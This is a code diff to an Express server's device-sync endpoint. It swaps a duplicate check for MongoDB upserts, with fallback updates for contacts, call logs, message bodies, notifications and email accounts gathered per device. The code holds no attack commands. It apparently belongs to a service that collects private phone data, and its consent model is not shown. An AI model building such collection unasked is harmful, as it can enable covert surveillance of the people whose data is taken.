@@ -222,14 +222,6 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                 
                 const dataHash = generateDataHash(deviceId, dataType, mappedItem);
                 
-                // Check for existing data with same hash
-                const existingData = await Model.findOne({ dataHash });
-                
-                if (existingData) {
-                    console.log(`Data already exists for ${dataType}, skipping duplicate`);
-                    continue;
-                }
-                
                 // Add sync time and hash to item
                 const itemWithMetadata = {
                     ...mappedItem,
@@ -237,10 +229,81 @@ app.post('/api/devices/:deviceId/sync', async (req, res) => {
                     dataHash
                 };
                 
-                // Save to device-specific collection
-                const newData = new Model(itemWithMetadata);
-                await newData.save();
-                itemsSynced++;
+                // Use upsert to handle duplicates gracefully
+                try {
+                    const result = await Model.findOneAndUpdate(
+                        { dataHash: dataHash },
+                        itemWithMetadata,
+                        { 
+                            upsert: true, 
+                            new: true,
+                            setDefaultsOnInsert: true 
+                        }
+                    );
+                    
+                    if (result) {
+                        itemsSynced++;
+                        console.log(`✅ ${dataType} item synced successfully (upsert)`);
+                    }
+                } catch (upsertError) {
+                    // If upsert fails due to unique constraint, try to find and update
+                    if (upsertError.code === 11000) {
+                        console.log(`⚠️ Duplicate detected for ${dataType}, attempting to update existing record`);
+                        try {
+                            // Try to find existing record by unique fields
+                            let query = {};
+                            switch (dataType) {
+                                case 'CONTACTS':
+                                    query = { deviceId: deviceId, phoneNumber: mappedItem.phoneNumber };
+                                    break;
+                                case 'CALL_LOGS':
+                                    query = { 
+                                        deviceId: deviceId, 
+                                        phoneNumber: mappedItem.phoneNumber, 
+                                        timestamp: mappedItem.timestamp,
+                                        duration: mappedItem.duration 
+                                    };
+                                    break;
+                                case 'MESSAGES':
+                                    query = { 
+                                        deviceId: deviceId, 
+                                        address: mappedItem.address, 
+                                        timestamp: mappedItem.timestamp,
+                                        body: mappedItem.body 
+                                    };
+                                    break;
+                                case 'NOTIFICATIONS':
+                                    query = { 
+                                        deviceId: deviceId, 
+                                        notificationId: mappedItem.notificationId 
+                                    };
+                                    break;
+                                case 'EMAIL_ACCOUNTS':
+                                    query = { 
+                                        deviceId: deviceId, 
+                                        accountId: mappedItem.accountId 
+                                    };
+                                    break;
+                            }
+                            
+                            const existingRecord = await Model.findOneAndUpdate(
+                                query,
+                                { ...itemWithMetadata, syncTime: new Date() },
+                                { new: true }
+                            );
+                            
+                            if (existingRecord) {
+                                console.log(`✅ ${dataType} item updated successfully`);
+                            } else {
+                                console.log(`⚠️ ${dataType} item not found for update, skipping`);
+                            }
+                        } catch (updateError) {
+                            console.log(`⚠️ Failed to update ${dataType} item:`, updateError.message);
+                        }
+                    } else {
+                        console.error(`❌ Upsert error for ${dataType}:`, upsertError.message);
+                    }
+                }
                 
             } catch (itemError) {
                 console.error(`Error processing item in ${dataType}:`, itemError);
